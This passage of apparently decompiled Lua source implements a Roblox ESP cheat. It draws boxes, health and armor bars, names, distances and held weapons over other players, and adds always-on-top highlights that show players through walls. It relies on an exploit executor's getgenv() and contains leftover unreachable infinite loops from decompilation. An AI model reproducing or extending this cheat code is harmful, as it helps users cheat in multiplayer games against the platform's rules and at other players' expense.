				arg:CreateObjects("UIStroke", { Parent = objects["Line_" .. i], Thickness = 1, LineJoinMode = Enum.LineJoinMode.Miter })
			end

			objects.HealthBarOutline = arg:CreateObjects("Frame", {
				Parent = objects["LeftBarHolder"],
				ZIndex = 5,
				LayoutOrder = 0,
				Visible = false,
				BackgroundTransparency = 0,
				Position = udim2(0, 0, 0, 0),
				Size = udim2(0, 4, 1, 0),
				BorderSizePixel = 0,
				BorderColor3 = Color3.fromRGB(0, 0, 0),
				BackgroundColor3 = Color3.fromRGB(0, 0, 0),
				ClipsDescendants = false,
			})

			arg:CreateObjects("UIStroke", { Parent = objects["HealthBarOutline"], Thickness = 1, LineJoinMode = Enum.LineJoinMode.Miter })

			objects["HealthBar"] = arg:CreateObjects("Frame", {
				Parent = objects.HealthBarOutline,
				ZIndex = 6,
				AnchorPoint = vector2(0, 1),
				Position = udim2(0, 0, 1, 0),
				Size = udim2(1, 0, 1, 0),
				BorderSizePixel = 0,
				BorderColor3 = Color3.fromRGB(0, 0, 0),
				BackgroundColor3 = Color3.fromRGB(255, 255, 255),
				ClipsDescendants = true,
			})

			local v30 = 1

			objects.HealthBarGradient = arg:CreateObjects("UIGradient", {
				Parent = objects.HealthBar,
				Rotation = 90,
				Color = ColorSequence.new({
					ColorSequenceKeypoint.new(0, table_["Bars"]["Health Bar"].Top),
					ColorSequenceKeypoint.new(0.5, table_.Bars["Health Bar"]["Mid"]),
					ColorSequenceKeypoint.new(1, table_.Bars["Health Bar"].Bot),
				}),
				Transparency = numberSequence({ new2(0, 0), new2(v30, 0) }),
			})

			objects.HealthBarText = arg:CreateObjects("TextLabel", {
				Parent = objects["HealthBarOutline"],
				FontFace = index.Minecraftia,
				TextSize = 16,
				ZIndex = 10,
				TextColor3 = Color3.fromRGB(255, 255, 255),
				Text = "",
				TextXAlignment = Enum.TextXAlignment.Center,
				TextYAlignment = Enum.TextYAlignment.Center,
				AnchorPoint = vector2(0.5, 0.5),
				Position = udim2(0.5, 0, 1, 0),
				BorderSizePixel = 0,
				Visible = false,
				BackgroundTransparency = 1,
				AutomaticSize = Enum.AutomaticSize.XY,
				Size = udim2(0, 0, 0, 0),
			})

			arg:CreateObjects("UIStroke", {
				Parent = objects.HealthBarText,
				Color = Color3.fromRGB(0, 0, 0),
				LineJoinMode = Enum.LineJoinMode.Miter,
			})

			objects.ArmorBarOutline = arg:CreateObjects("Frame", {
				Parent = objects.BottomBarHolder,
				ZIndex = 5,
				LayoutOrder = 0,
				Visible = false,
				BackgroundTransparency = 0,
				Position = udim2(0, 0, 0, 0),
				Size = udim2(1, 0, 0, 4),
				BorderSizePixel = 0,
				BorderColor3 = Color3.fromRGB(0, 0, 0),
				BackgroundColor3 = Color3.fromRGB(0, 0, 0),
				ClipsDescendants = true,
			})

			arg:CreateObjects("UIStroke", { Parent = objects.ArmorBarOutline, Thickness = 1, LineJoinMode = Enum.LineJoinMode.Miter })

			objects.ArmorBar = arg:CreateObjects("Frame", {
				Parent = objects["ArmorBarOutline"],
				ZIndex = 6,
				AnchorPoint = vector2(0, 0),
				Position = udim2(0, 0, 0, 0),
				Size = udim2(1, 0, 1, 0),
				BorderSizePixel = 0,
				BorderColor3 = Color3.fromRGB(0, 0, 0),
				BackgroundColor3 = Color3.fromRGB(255, 255, 255),
			})

			objects.ArmorBarGradient = arg:CreateObjects("UIGradient", {
				Parent = objects.ArmorBar,
				Rotation = 0,
				Color = ColorSequence.new({
					ColorSequenceKeypoint.new(0, table_["Bars"]["Armor Bar"]["Top"]),
					ColorSequenceKeypoint.new(0.5, table_.Bars["Armor Bar"].Mid),
					ColorSequenceKeypoint.new(1, table_.Bars["Armor Bar"].Bot),
				}),
				Transparency = numberSequence({ new2(0, 0), new2(1, 0) }),
			})

			objects.ArmorBarText = arg:CreateObjects("TextLabel", {
				Parent = objects.ArmorBar,
				FontFace = index.Minecraftia,
				TextSize = 16,
				ZIndex = 10,
				TextColor3 = Color3.fromRGB(255, 255, 255),
				Text = "",
				TextXAlignment = Enum.TextXAlignment.Center,
				AnchorPoint = vector2(0.5, 0.5),
				Position = udim2(0.5, 0, 0.5, 0),
				BorderSizePixel = 0,
				Visible = false,
				BackgroundTransparency = 1,
				AutomaticSize = Enum.AutomaticSize.XY,
				Size = udim2(0, 0, 0, 0),
			})

			arg:CreateObjects("UIStroke", {
				Parent = objects.ArmorBarText,
				Color = Color3.fromRGB(0, 0, 0),
				LineJoinMode = Enum.LineJoinMode.Miter,
			})

			objects["TargetName"] = arg:CreateObjects("TextLabel", {
				Parent = objects["TopTextHolder"],
				FontFace = index.Minecraftia,
				TextSize = 20,
				LayoutOrder = 2,
				TextColor3 = table_.Texts["Name"].Color,
				Text = "",
				TextXAlignment = Enum.TextXAlignment.Center,
				BorderSizePixel = 0,
				Visible = false,
				BackgroundTransparency = 1,
				ZIndex = 5,
				AutomaticSize = Enum.AutomaticSize.XY,
				Size = udim2(0, 0, 0, 0),
			})

			arg:CreateObjects("UIStroke", { Parent = objects["TargetName"], Color = Color3.fromRGB(0, 0, 0), LineJoinMode = Enum.LineJoinMode.Miter })

			objects.Distance = arg:CreateObjects("TextLabel", {
				Parent = objects.BottomTextHolder,
				FontFace = index.Minecraftia,
				TextSize = 16,
				LayoutOrder = 2,
				TextColor3 = table_.Texts["Distance"].Color,
				Text = "",
				TextXAlignment = Enum.TextXAlignment.Center,
				BorderSizePixel = 0,
				Visible = false,
				BackgroundTransparency = 1,
				ZIndex = 5,
				AutomaticSize = Enum.AutomaticSize.XY,
				Size = udim2(0, 0, 0, 0),
			})

			arg:CreateObjects("UIStroke", { Parent = objects.Distance, Color = Color3.fromRGB(0, 0, 0), LineJoinMode = Enum.LineJoinMode.Miter })

			objects["WalkFlag"] = arg:CreateObjects("TextLabel", {
				Parent = objects.RightTextHolder,
				FontFace = index.Minecraftia,
				TextSize = 16,
				LayoutOrder = 1,
				TextColor3 = table_.Flags["Walking"].Color,
				Text = table_.Flags.Walking.Text,
				TextXAlignment = Enum.TextXAlignment.Left,
				BorderSizePixel = 0,
				Visible = false,
				BackgroundTransparency = 1,
				ZIndex = 5,
				AutomaticSize = Enum.AutomaticSize.XY,
				Size = udim2(0, 0, 0, 0),
			})

			arg:CreateObjects("UIStroke", { Parent = objects.WalkFlag, Color = Color3.fromRGB(0, 0, 0), LineJoinMode = Enum.LineJoinMode.Miter })

			objects["JumpFlag"] = arg:CreateObjects("TextLabel", {
				Parent = objects.RightTextHolder,
				FontFace = index.Minecraftia,
				TextSize = 16,
				LayoutOrder = 2,
				TextColor3 = table_.Flags.Jumping["Color"],
				Text = table_.Flags.Jumping.Text,
				TextXAlignment = Enum.TextXAlignment.Left,
				BorderSizePixel = 0,
				Visible = false,
				BackgroundTransparency = 1,
				ZIndex = 5,
				AutomaticSize = Enum.AutomaticSize.XY,
				Size = udim2(0, 0, 0, 0),
			})

			arg:CreateObjects("UIStroke", {
				Parent = objects.JumpFlag,
				Color = Color3.fromRGB(0, 0, 0),
				LineJoinMode = Enum.LineJoinMode.Miter,
			})

			objects.SwimmingFlag = arg:CreateObjects("TextLabel", {
				Parent = objects.RightTextHolder,
				FontFace = index.Minecraftia,
				TextSize = 16,
				LayoutOrder = 4,
				TextColor3 = table_.Flags.Swimming.Color,
				Text = table_.Flags.Swimming["Text"],
				TextXAlignment = Enum.TextXAlignment.Left,
				BorderSizePixel = 0,
				Visible = false,
				BackgroundTransparency = 1,
				ZIndex = 5,
				AutomaticSize = Enum.AutomaticSize.XY,
				Size = udim2(0, 0, 0, 0),
			})

			arg:CreateObjects("UIStroke", {
				Parent = objects.SwimmingFlag,
				Color = Color3.fromRGB(0, 0, 0),
				LineJoinMode = Enum.LineJoinMode.Miter,
			})

			objects.Weapon = arg:CreateObjects("TextLabel", {
				Parent = objects["BottomTextHolder"],
				FontFace = index.Minecraftia,
				TextSize = 16,
				LayoutOrder = 3,
				TextColor3 = table_.Texts.Weapon["Color"],
				Text = "none",
				TextXAlignment = Enum.TextXAlignment.Center,
				BorderSizePixel = 0,
				Visible = false,
				BackgroundTransparency = 1,
				ZIndex = 5,
				AutomaticSize = Enum.AutomaticSize.XY,
				Size = udim2(0, 0, 0, 0),
			})

			arg:CreateObjects("UIStroke", { Parent = objects.Weapon, Color = Color3.fromRGB(0, 0, 0), LineJoinMode = Enum.LineJoinMode.Miter })

			objects.Highlight = arg:CreateObjects("Highlight", {
				Parent = arg.Holder,
				FillColor = Color3.fromRGB(255, 255, 255),
				OutlineColor = Color3.fromRGB(0, 0, 0),
				FillTransparency = table_.Chams.FillTransparency,
				OutlineTransparency = 0,
				DepthMode = Enum.HighlightDepthMode.AlwaysOnTop,
				Enabled = false,
			})
		end

		local tbl10 = {
			{ udim2(0, -1, 0, -1), udim2(0.3, 0, 0, 1), vector2(0, 0), 0 },
			{
				udim2(0, -1, 0, -1),
				udim2(0, 1, 0.3, 0),
				vector2(0, 0),
				180,
			},
			{
				udim2(1, 1, 0, -1),
				udim2(0.3, 0, 0, 1),
				vector2(1, 0),
				0,
			},
			{ udim2(1, 1, 0, -1), udim2(0, 1, 0.3, 0), vector2(1, 0), 180 },
			{
				udim2(0, -1, 1, 1),
				udim2(0.3, 0, 0, 1),
				vector2(0, 1),
				0,
			},
			{ udim2(0, -1, 1, 1), udim2(0, 1, 0.3, 0), vector2(0, 1), -180 },
			{ udim2(1, 1, 1, 1), udim2(0.3, 0, 0, 1), vector2(1, 1), 0 },
			{
				udim2(1, 1, 1, 1),
				udim2(0, 1, 0.3, 0),
				vector2(1, 1),
				-180,
			},
		}

		index.CalculateBox = function(arg, humanoid)
			local rootPart = humanoid.RootPart
			if not rootPart then
				return nil, nil, nil, nil, false
			end
			local v25, v26 = worldToViewportPoint(currentCamera2, rootPart.Position)
			if not v26 then
				return nil, nil, nil, nil, false
			end
			local n11 = rootPart.Size.Y * y / (v25.Z * 2)
			local n12 = 3 * n11
			local n13 = 4.5 * n11
			return n12, n13, v25.X - n12 * 0.5, v25.Y - n13 * 0.5, v26
		end

		index.AddTarget = function(arg, player)
			if player == localPlayer4 and not table_["ShowLocalPlayer"] then


				return
			end

			if arg.Cache[player] then
				return
			end

			local tbl11 = {
				Player = player,
				Objects = {},
				["Conns"] = {},
				Character = nil,
				RootPart = nil,
				Humanoid = nil,
				Children = nil,
				Health = 0,
				MaxHealth = 100,
				Armor = 100,
				MaxArmor = 100,
				CurrentTool = nil,
				Alive = false,
				["LastChamsT"] = nil,
				LastW = nil,
				["LastH"] = nil,
				LastX = nil,
				LastY = nil,
				WalkActive = false,
				["JumpActive"] = false,
				["FallingActive"] = false,
				SwimmingActive = false,
				LastGlowTop = nil,
				["LastGlowBot"] = nil,
				LastGlowT1 = nil,
				LastGlowT2 = nil,
				LastGradTop = nil,
				LastGradBot = nil,
				LastFillTop = nil,
				LastFillBot = nil,
				["LastFillT1"] = nil,
				LastFillT2 = nil,
				LastDist = nil,
				LastDistColor = nil,
				LastDisplayName = nil,
				LastNameColor = nil,
				LastHealthTop = nil,
				["LastHealthMid"] = nil,
				LastHealthBot = nil,
				LastHealthFloor = nil,
				LastRatio = nil,
				LastArmorTop = nil,
				LastArmorMid = nil,
				LastArmorBot = nil,
				LastArmorFloor = nil,
				["LastArmorRatio"] = nil,
				LastWeapon = nil,
				LastWeaponColor = nil,
				LastChamsFill = nil,
				["LastChamsOutline"] = nil,
				["CustomGradTop"] = getgenv()._CH_PlayerESPColor,
				CustomGradBot = getgenv()._CH_PlayerESPColor,
			}

			arg:InitEsp(tbl11)
			arg.Cache[player] = tbl11

			tbl11["BindHealth"] = ({ BindHealth = function(humanoid)
				if tbl11.Conns.Health then
					tbl11.Conns.Health:Disconnect()
				end

				do
					if tbl11["Conns"].Died then
						tbl11["Conns"]["Died"]:Disconnect()
					end

					tbl11.Humanoid = humanoid
					tbl11["Health"] = humanoid.Health
					tbl11.MaxHealth = humanoid.MaxHealth
					tbl11["Alive"] = tbl11.Health > 0

					tbl11["Conns"].Health = humanoid.HealthChanged:Connect(function(health)
						tbl11.Alive = health > 0
						tbl11["Health"] = health
					end)

					tbl11.Conns.Died = humanoid.Died:Connect(function()
						tbl11["Alive"] = false
					end)

					return
				end

				while true do
				end
			end }).BindHealth

			tbl11.BindTool = ({ BindTool = function(instance)
				if tbl11.Conns.ToolAdded then
					tbl11.Conns.ToolAdded:Disconnect()
				end

				if tbl11.Conns["ToolRemoved"] then
					tbl11.Conns.ToolRemoved:Disconnect()
				end

				if tbl11["Children"] then
					for _, instance2 in tbl11.Children do
						if instance2:IsA("Tool") then
							tbl11.CurrentTool = instance2.Name
							break
						end
					end
				end

				tbl11.Conns.ToolAdded = instance.ChildAdded:Connect(function(child)
					if child:IsA("Tool") then
						tbl11.CurrentTool = child.Name
					end
				end)

				tbl11.Conns.ToolRemoved = instance.ChildRemoved:Connect(function(child)
					if child:IsA("Tool") then
						tbl11.CurrentTool = nil
					end
				end)
			end }).BindTool

			tbl11.BindChildren = ({ BindChildren = function(instance)
				if tbl11.Conns.ChildAdded then
					tbl11.Conns.ChildAdded:Disconnect()


				end

				if tbl11.Conns["ChildRemoved"] then
					tbl11.Conns["ChildRemoved"]:Disconnect()
				end

				local children = instance:GetChildren()
				tbl11.Children = children

				tbl11.Conns.ChildAdded = instance.ChildAdded:Connect(function(child)
					children[#children + 1] = child
				end)

				tbl11["Conns"].ChildRemoved = instance.ChildRemoved:Connect(function(child)
					for i = #children, 1, -1 do
						if children[i] == child then
							remove(children, i)
							break
						end
					end
				end)

				tbl11.BindTool(instance)
			end }).BindChildren

			tbl11.BindFlags = ({ BindFlags = function(humanoid)
				if tbl11.Conns.MoveDir then
					tbl11.Conns.MoveDir:Disconnect()
				end

				if tbl11.Conns.StateChange then
					tbl11.Conns.StateChange:Disconnect()
				end

				local objects = tbl11.Objects
				tbl11["JumpActive"] = false
				tbl11.WalkActive = false
				tbl11.FallingActive = false
				tbl11["SwimmingActive"] = false

				objects.WalkFlag.Visible = false
				objects["JumpFlag"].Visible = false
				objects["SwimmingFlag"].Visible = false

				tbl11.Conns.MoveDir = humanoid:GetPropertyChangedSignal("MoveDirection"):Connect(function()
					local flag11 = humanoid.MoveDirection ~= v24

					if flag11 and not tbl11.WalkActive then
						tbl11["WalkActive"] = true

						if tbl11.JumpActive then
							objects.WalkFlag.LayoutOrder = 2
						else
							objects["WalkFlag"].LayoutOrder = 1
							objects.JumpFlag.LayoutOrder = 2
						end

						objects["WalkFlag"].Visible = table_.Flags["Walking"].Enabled
					elseif not flag11 and tbl11.WalkActive then
						tbl11.WalkActive = false
						objects.WalkFlag.Visible = false
					end
				end)

				tbl11.Conns.StateChange = humanoid.StateChanged:Connect(function(old, new)
					if new == Enum.HumanoidStateType.Jumping and not tbl11.JumpActive then
						tbl11.JumpActive = true
						objects.JumpFlag.Visible = table_.Flags.Jumping.Enabled

						if tbl11.WalkActive then
							objects.JumpFlag.LayoutOrder = 2
						else
							objects.JumpFlag.LayoutOrder = 1
							objects.WalkFlag.LayoutOrder = 2
						end
					elseif new == Enum.HumanoidStateType.Landed and tbl11.JumpActive then
						tbl11.JumpActive = false
						objects.JumpFlag.Visible = false

						if tbl11["WalkActive"] then
							objects.WalkFlag.LayoutOrder = 1
						end
					end

					if new == Enum.HumanoidStateType.Swimming and not tbl11.SwimmingActive then
						tbl11.SwimmingActive = true
						objects["SwimmingFlag"].Visible = table_.Flags["Swimming"].Enabled
					elseif new ~= Enum.HumanoidStateType.Swimming and tbl11["SwimmingActive"] then
						tbl11.SwimmingActive = false
						objects.SwimmingFlag.Visible = false
					end
				end)
			end }).BindFlags

			local tbl12 = { OnCharacter = function(character)
				tbl11.Character = character
				tbl11.RootPart = nil
				tbl11["Humanoid"] = nil
				tbl11.Children = nil
				tbl11.Alive = false
				tbl11.WalkActive = false
				tbl11.JumpActive = false
				tbl11.FallingActive = false
				tbl11.SwimmingActive = false
				if not character or not character.Parent then
					return
				end
				local humanoidRootPart = findFirstChild(character, "HumanoidRootPart") or character:WaitForChild("HumanoidRootPart", 10)
				local firstChildOfClass = findFirstChildOfClass(character, "Humanoid") or character:WaitForChild("Humanoid", 10)
				if not humanoidRootPart or not firstChildOfClass then
					return
				end

				if not character.Parent then
					return
				end
				tbl11["RootPart"] = humanoidRootPart
				tbl11.Humanoid = firstChildOfClass
				tbl11.BindChildren(character)
				tbl11.BindHealth(firstChildOfClass)
			end }

			tbl11.Conns.CharAdded = player.CharacterAdded:Connect(function(character)
				task.defer(tbl12.OnCharacter, character)
			end)

			if player.Character and player.Character.Parent then
				task.defer(tbl12.OnCharacter, player.Character)
			end
		end

		index.RemoveTarget = function(arg, arg2)
			local v25 = arg["Cache"][arg2]

			if not v25 then
				do
					return
				end

				while true do
				end
			end

			for _, connection10 in v25.Conns do
				connection10:Disconnect()
			end

			clear(v25.Conns)

			if v25.Objects.Highlight then
				pcall(function()
					v25.Objects.Highlight:Destroy()
				end)
			end

			if v25.Objects.TargetHolder then
				v25["Objects"].TargetHolder:Destroy()
			end

			clear(v25.Objects)
			arg.Cache[arg2] = nil
		end

		index.Update = function(arg, player, player2)
			local objects = player2.Objects

			if player2.RootPart then
				if not player2.Alive then
					if objects["TargetHolder"].Visible then
						objects.TargetHolder.Visible = false


					end

					return
				end

				local v25 = floor((position - player2.RootPart.Position).Magnitude)

				if v25 > table_.Distance then
					if objects["TargetHolder"].Visible then
						objects["TargetHolder"].Visible = false
					end

					return
				end

				local rawW, v26, v27, rawY, v28 = arg:CalculateBox(player2)

				if not v28 or not rawW then
					if objects.TargetHolder.Visible then
						objects.TargetHolder.Visible = false
					end

					return
				end

				if not objects.TargetHolder.Visible then
					objects["TargetHolder"].Visible = true
				end

				local flag11 = player2.RawX == nil
				local rawX = player2.RawX or v27
				local rawY2 = player2.RawY or rawY
				local rawW2 = player2["RawW"] or rawW
				local rawH = player2.RawH or v26
				local flag12 = flag11 or abs(v27 - rawX) > 1 or abs(rawY - rawY2) > 1
				flag11 = flag11 or abs(rawW - rawW2) > 1 or abs(v26 - rawH) > 1

				if flag12 then
					local lastX = floor(v27 + 0.5)
					local v29 = floor(rawY + 0.5)
					objects.TargetHolder.Position = udim22(lastX, v29)
					player2["RawX"] = v27
					player2.RawY = rawY
					player2.LastX = lastX
					player2["LastY"] = v29
				end

				if flag11 then
					local lastW = floor(rawW + 0.5)
					local lastH = floor(v26 + 0.5)
					objects.TargetHolder.Size = udim22(lastW, lastH)
					objects.BoxGlow.Size = udim22(lastW, lastH)
					objects["BoxOutlineHolder"].Size = udim22(lastW, lastH)
					objects["BoxInlineHolder"].Size = udim22(lastW + 2, lastH + 2)
					objects["BoxFill"].Size = udim22(lastW, lastH)
					objects["CornerHolder"].Size = udim22(lastW + 2, lastH + 2)

					player2.RawW = rawW
					player2["RawH"] = v26
					player2.LastW = lastW
					player2.LastH = lastH
				end

				local boxes = table_.Boxes
				local texts = table_.Texts

				if boxes.Enabled then
					if boxes["Box Glow"].Enabled then
						if objects["BoxGlow"].ImageTransparency ~= 0 then
							objects.BoxGlow.ImageTransparency = 0
						end

						local customGradTop = player2.CustomGradTop or boxes["Box Glow"].Top
						local customGradBot = player2.CustomGradBot or boxes["Box Glow"]["Bot"]

						if player2["LastGlowTop"] ~= customGradTop or player2.LastGlowBot ~= customGradBot then
							local new = ColorSequenceKeypoint.new
							objects["BoxGlowGradient"].Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, customGradTop), new(1, customGradBot) })
							player2.LastGlowTop = customGradTop
							player2.LastGlowBot = customGradBot
						end

						local lastGlowT1 = boxes["Box Glow"]["Transparency"][1]
						local lastGlowT2 = boxes["Box Glow"].Transparency[2]

						if player2.LastGlowT1 ~= lastGlowT1 or player2.LastGlowT2 ~= lastGlowT2 then
							objects.BoxGlowGradient.Transparency = numberSequence({ new2(0, lastGlowT1), new2(1, lastGlowT2) })
							player2.LastGlowT1 = lastGlowT1
							player2.LastGlowT2 = lastGlowT2
						end
					elseif objects.BoxGlow.ImageTransparency ~= 1 then
						objects["BoxGlow"].ImageTransparency = 1
					end

					if boxes.Type == "Corner" then
						if objects.BoxOutlineHolder.Visible then
							objects.BoxOutlineHolder.Visible = false
						end

						if objects.BoxInlineHolder.Visible then
							objects["BoxInlineHolder"].Visible = false
						end

						if objects["BoxFill"].Visible then
							objects.BoxFill.Visible = false
						end

						if not objects.CornerHolder.Visible then
							objects.CornerHolder.Visible = true
						end

						local customGradTop = player2.CustomGradTop or boxes.Gradients["Top"]

						for i = 1, 8 do
							local object = objects["Line_" .. i]
							local uiStroke = object:FindFirstChildOfClass("UIStroke")
							local v29 = tbl10[i]

							object.Position = v29[1]
							object.Size = v29[2]
							object.AnchorPoint = v29[3]
							object.Rotation = v29[4]
							object.BackgroundColor3 = customGradTop
							object.BackgroundTransparency = 0

							if uiStroke then
								uiStroke.Color = customGradTop
							end

							object.Visible = true
						end
					else
						if objects["CornerHolder"].Visible then
							objects.CornerHolder.Visible = false
						end

						for i = 1, 8 do
							if objects["Line_" .. i].Visible then
								objects["Line_" .. i].Visible = false
							end
						end

						if not objects.BoxOutlineHolder.Visible then
							objects.BoxOutlineHolder.Visible = true
						end

						if not objects.BoxInlineHolder.Visible then
							objects.BoxInlineHolder.Visible = true
						end

						local top = player2["CustomGradTop"] or boxes["Gradients"].Top
						local bot = player2["CustomGradBot"] or boxes["Gradients"].Bot

						if player2.LastGradTop ~= top or player2.LastGradBot ~= bot then
							local new = ColorSequenceKeypoint.new
							objects.BoxInlineGradient.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, top), new(1, bot) })
							player2["LastGradTop"] = top
							player2["LastGradBot"] = bot
						end

						if boxes["Filled"].Enabled then
							if not objects.BoxFill.Visible then
								objects.BoxFill.Visible = true
							end

							local customGradTop = player2.CustomGradTop or boxes.Filled.Top
							local customGradBot = player2.CustomGradBot or boxes["Filled"]["Bot"]
							local lastFillT1 = boxes.Filled.Transparency[1]
							local lastFillT2 = boxes.Filled["Transparency"][2]

							if player2["LastFillTop"] ~= customGradTop or player2.LastFillBot ~= customGradBot then
								local new = ColorSequenceKeypoint.new
								objects.BoxFillGradient.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, customGradTop), new(1, customGradBot) })
								player2.LastFillTop = customGradTop
								player2["LastFillBot"] = customGradBot
							end

							if player2.LastFillT1 ~= lastFillT1 or player2.LastFillT2 ~= lastFillT2 then
								objects.BoxFillGradient.Transparency = numberSequence({ new2(0, lastFillT1), new2(1, lastFillT2) })
								player2.LastFillT1 = lastFillT1
								player2.LastFillT2 = lastFillT2
							end
						elseif objects.BoxFill.Visible then
							objects["BoxFill"].Visible = false
						end
					end
				else
					if objects.BoxGlow.ImageTransparency ~= 1 then
						objects.BoxGlow.ImageTransparency = 1
					end

					if objects.BoxOutlineHolder.Visible then
						objects["BoxOutlineHolder"].Visible = false
					end

					if objects["BoxInlineHolder"].Visible then
						objects["BoxInlineHolder"].Visible = false
					end

					if objects.BoxFill.Visible then
						objects["BoxFill"].Visible = false
					end

					if objects.CornerHolder.Visible then
						objects.CornerHolder.Visible = false
					end

					for i = 1, 8 do
						if objects["Line_" .. i].Visible then
							objects["Line_" .. i].Visible = false
						end
					end
				end

				if texts.Name["Enabled"] then
					if not objects["TargetName"].Visible then
						objects.TargetName.Visible = true
					end

					local displayName = player2.DisplayName or player and player.DisplayName or "?"

					if player2.LastDisplayName ~= displayName then
						objects["TargetName"].Text = displayName
						player2.LastDisplayName = displayName
					end

					local color = texts["Name"].Color

					if player2.LastNameColor ~= color then
						objects.TargetName.TextColor3 = color
						player2.LastNameColor = color
					end
				elseif objects.TargetName.Visible then
					objects.TargetName.Visible = false
				end

				if texts["Distance"].Enabled then
					if not objects.Distance.Visible then
						objects.Distance.Visible = true
					end

					if player2["LastDist"] ~= v25 then
						objects.Distance.Text = format("%dst", v25)
						player2["LastDist"] = v25
					end

					local color = texts["Distance"].Color

					if player2["LastDistColor"] ~= color then
						objects.Distance.TextColor3 = color



						player2.LastDistColor = color
					end
				elseif objects["Distance"].Visible then
					objects.Distance.Visible = false
				end

				local bar = table_.Bars["Armor Bar"]

				if table_.Bars["Health Bar"].Enabled then
					local n11 = player2["Health"] or 0
					local lastRatio = clamp(n11 / (player2["MaxHealth"] or 100), 0, 1)

					if not objects.LeftBarHolder.Visible then
						objects["LeftBarHolder"].Visible = true
					end

					if not objects.HealthBarOutline.Visible then
						objects.HealthBarOutline.Visible = true
					end

					local flag13 = player2.LastRatio ~= lastRatio

					if flag13 then
						objects.HealthBar.Size = udim2(1, 0, lastRatio, 0)
						player2.LastRatio = lastRatio
					end

					local lastRatio2 = lastRatio * 0.33
					local color = Color3.fromHSV(lastRatio2, 1, 1)
					local color2 = Color3.fromHSV(clamp(lastRatio2 - 0.05, 0, 0.33), 1, 0.84999999999999998)

					if player2.LastHealthHue ~= lastRatio2 then
						local new = ColorSequenceKeypoint.new
						objects.HealthBarGradient.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, color), new(1, color2) })
						player2.LastHealthHue = lastRatio2
					end

					if not objects.HealthBarText.Visible then
						objects.HealthBarText.Visible = true
					end

					local lastHealthFloor = floor(n11)

					if player2["LastHealthFloor"] ~= lastHealthFloor or flag13 then
						objects["HealthBarText"].Text = format("%d", lastHealthFloor)
						objects.HealthBarText.Position = udim2(1, -10, 1 - lastRatio, 1)
						player2.LastHealthFloor = lastHealthFloor
					end
				else
					if objects.HealthBarOutline.Visible then
						objects.HealthBarOutline.Visible = false
					end

					if objects.HealthBarText.Visible then
						objects["HealthBarText"].Visible = false
					end

					if not bar.Enabled then
						if objects["LeftBarHolder"].Visible then
							objects.LeftBarHolder.Visible = false
						end
					end
				end

				if bar.Enabled then
					local lastArmorRatio = clamp(player2.Armor / player2.MaxArmor, 0, 1)

					if not objects["BottomBarHolder"].Visible then
						objects["BottomBarHolder"].Visible = true
					end

					if not objects.ArmorBarOutline.Visible then
						objects.ArmorBarOutline.Visible = true
					end

					if player2["LastArmorRatio"] ~= lastArmorRatio then
						objects.ArmorBar.Size = udim2(lastArmorRatio, 0, 1, 0)
						player2.LastArmorRatio = lastArmorRatio
					end

					local top = bar.Top
					local mid = bar.Mid
					local bot = bar.Bot

					if player2.LastArmorTop ~= top or player2.LastArmorMid ~= mid or player2.LastArmorBot ~= bot then
						objects["ArmorBarGradient"].Color = ColorSequence.new({
							ColorSequenceKeypoint.new(0, top),
							ColorSequenceKeypoint.new(0.5, mid),
							ColorSequenceKeypoint.new(1, bot),
						})

						player2["LastArmorTop"] = top
						player2.LastArmorMid = mid
						player2.LastArmorBot = bot
					end
				else
					if objects.ArmorBarOutline.Visible then
						objects["ArmorBarOutline"].Visible = false
					end

					if objects.BottomBarHolder.Visible then
						objects.BottomBarHolder.Visible = false
					end
				end

				if texts.Weapon.Enabled then
					if not objects.Weapon.Visible then
						objects["Weapon"].Visible = true
					end

					local text = player2["CurrentTool"] or "none"

					if player2.LastWeapon ~= text then
						objects.Weapon.Text = text
						player2.LastWeapon = text
					end

					local color = texts.Weapon.Color

					if player2.LastWeaponColor ~= color then
						objects.Weapon.TextColor3 = color
						player2.LastWeaponColor = color
					end
				elseif objects.Weapon.Visible then
					objects["Weapon"].Visible = false
				end

				return
			end

			do
				if objects.TargetHolder.Visible then
					objects.TargetHolder.Visible = false
				end

				return
			end

			while true do
			end
		end

		index:CreateThreads("Renderer", runService.RenderStepped, function()
			local now2 = os.clock()

			if not (now2 - now3 < n9) then
				now3 = now2
				position = currentCamera2.CFrame.Position
				local v25 = table_["Enabled"]
				local chams = table_.Chams
				local enabled2 = chams.Enabled

				for k, player in index["Cache"] do
					local highlight, visible, fillTransparency, fillColor, outlineColor

					if not player.ModelKey and not v25 then
						if k ~= localPlayer4 or not table_.ShowLocalPlayer then
							if player.Objects["TargetHolder"].Visible then
								player["Objects"].TargetHolder.Visible = false
							end

							if player["Objects"]["Highlight"] and player.Objects.Highlight.Enabled then
								player.Objects["Highlight"].Enabled = false
							end

							continue
						end

						index:Update(k, player)
						highlight = player.Objects.Highlight
						if not highlight then
							continue
						end
						visible = enabled2 and player.Objects.TargetHolder.Visible

						if visible then
							if not highlight.Enabled then
								highlight.Enabled = true
							end

							if highlight.Adornee ~= player.Character then
								highlight.Adornee = player.Character
							end

							fillTransparency = chams.FillTransparency

							if player.LastChamsT ~= fillTransparency then
								highlight.FillTransparency = fillTransparency
								player["LastChamsT"] = fillTransparency
							end

							fillColor = chams.FillColor

							if player.LastChamsFill ~= fillColor then
								highlight.FillColor = fillColor
								player["LastChamsFill"] = fillColor
							end

							outlineColor = chams.OutlineColor

							if player.LastChamsOutline ~= outlineColor then
								highlight.OutlineColor = outlineColor
								player.LastChamsOutline = outlineColor
							end
						elseif highlight.Enabled then
							highlight.Enabled = false
						end
					else
						index:Update(k, player)
						highlight = player.Objects.Highlight
						if not highlight then
							continue
						end
						visible = enabled2 and player.Objects.TargetHolder.Visible

						if visible then
							if not highlight.Enabled then
								highlight.Enabled = true
							end

							if highlight.Adornee ~= player.Character then
								highlight.Adornee = player.Character
							end

							fillTransparency = chams.FillTransparency

							if player.LastChamsT ~= fillTransparency then
								highlight.FillTransparency = fillTransparency
								player["LastChamsT"] = fillTransparency
							end

							fillColor = chams.FillColor

							if player.LastChamsFill ~= fillColor then
								highlight.FillColor = fillColor
								player["LastChamsFill"] = fillColor
							end

							outlineColor = chams.OutlineColor

							if player.LastChamsOutline ~= outlineColor then
								highlight.OutlineColor = outlineColor
								player.LastChamsOutline = outlineColor
							end
						elseif highlight.Enabled then
							highlight.Enabled = false
						end
					end
				end

				return
			end

			do
				return
			end

			while true do
			end
		end)

		for _, v25 in players:GetPlayers() do
			index:AddTarget(v25)
		end

